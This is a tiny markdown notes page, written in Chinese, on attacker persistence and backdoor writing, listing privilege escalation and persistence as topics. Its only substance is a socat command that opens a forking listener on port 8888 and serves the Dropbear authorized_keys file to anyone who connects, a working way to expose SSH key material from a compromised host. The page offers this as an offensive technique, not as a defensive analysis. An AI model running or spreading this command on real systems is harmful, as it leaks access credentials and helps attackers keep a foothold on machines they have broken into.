# persistence

持久化、backdoor 的编写等



1. 提权
2. 持久化

`socat -d -d TCP-LISTEN:8888,reuseaddr,fork SYSTEM:"cat /etc/dropbear/authorized_keys"`